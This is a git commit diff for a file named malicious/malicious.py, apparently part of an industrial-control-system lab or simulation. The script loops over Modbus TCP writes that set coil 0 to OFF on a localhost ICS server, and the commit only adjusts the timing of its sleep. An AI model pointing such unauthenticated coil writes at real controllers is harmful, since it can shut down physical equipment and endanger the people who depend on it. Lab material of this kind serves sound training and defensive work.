ba236d1c8fb3d56cf168faa3e4597d4d00d14e8f
DanAun <23170040+DanAun@users.noreply.github.com>
2025-06-12 14:13:53 +0200

    fix: moved sleep to start of loop to avoid error when starting up services (ics,webui..)

--- malicious/malicious.py
+++ malicious/malicious.py
@@ -3,7 +3,7 @@ from pymodbus.client import ModbusTcpClient
 import time
 from ics.ics import ICS_SERVER_PORT
 
-REQUEST_FREQUENCY = 5  # Frequency of requests in seconds
+REQUEST_FREQUENCY = 10  # Frequency of requests in seconds
 RETRY_DELAY = 10  # Delay in seconds before retrying connection
 
 def loop_modbus_request():
@@ -11,15 +11,14 @@ def loop_modbus_request():
     client = ModbusTcpClient('localhost', port=ICS_SERVER_PORT)
     
     while True:
+        # Small delay to prevent overwhelming the server
+        time.sleep(REQUEST_FREQUENCY)
         try:
             # Connect to the server
             client.connect()
             
             # Write 0 (OFF) to coil at address 0
             client.write_coil(0, False)
-            
-            # Small delay to prevent overwhelming the server
-            time.sleep(REQUEST_FREQUENCY)
         
         except pymodbus.exceptions.ConnectionException as e:
             print(f"Connection error: {e}")
